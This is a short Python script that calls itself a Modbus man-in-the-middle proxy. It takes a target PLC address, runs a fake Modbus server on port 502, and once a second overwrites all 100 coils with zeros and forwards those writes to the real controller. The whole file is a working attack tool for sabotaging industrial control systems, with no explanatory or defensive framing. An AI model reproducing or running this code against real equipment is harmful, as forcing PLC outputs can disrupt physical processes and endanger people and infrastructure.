import asyncio
import threading
from pymodbus.server import StartTcpServer
from pymodbus.device import ModbusDeviceIdentification
from pymodbus.datastore import ModbusSequentialDataBlock, ModbusSlaveContext, ModbusServerContext
from pymodbus.client import AsyncModbusTcpClient

plc_ip = input("Enter target ip-address:")

store = ModbusSlaveContext(
    di=ModbusSequentialDataBlock(0, [0]*100),
    co=ModbusSequentialDataBlock(0, [0]*100),
    hr=ModbusSequentialDataBlock(0, [0]*100),
    ir=ModbusSequentialDataBlock(0, [0]*100),
)
context = ModbusServerContext(slaves=store, single=True)

async def forward_request(address, values):
    target_ip = plc_ip
    async with AsyncModbusTcpClient(target_ip, port=502) as client:
        if not client.connected:
            print(f"[-] Failed to connect to PLC: {target_ip}")
            return
        await client.write_coils(address, values)
        print(f"[+] Written to PLC: {target_ip} forwarded: {values}")

async def manipulate_coils():
    while True:
        coils = context[0].getValues(1, 0, count=100)
        manipulated = [0] * len(coils)
        context[0].setValues(1, 0, manipulated)
        await forward_request(0, manipulated)
        await asyncio.sleep(1)

def run_server():
    StartTcpServer(context=context, identity="", address=("0.0.0.0", 502))

if __name__ == "__main__":
    print("[*] Starting Modbus-MITM-Proxy at port 502")

    server_thread = threading.Thread(target=run_server)
    server_thread.start()

    asyncio.run(manipulate_coils())
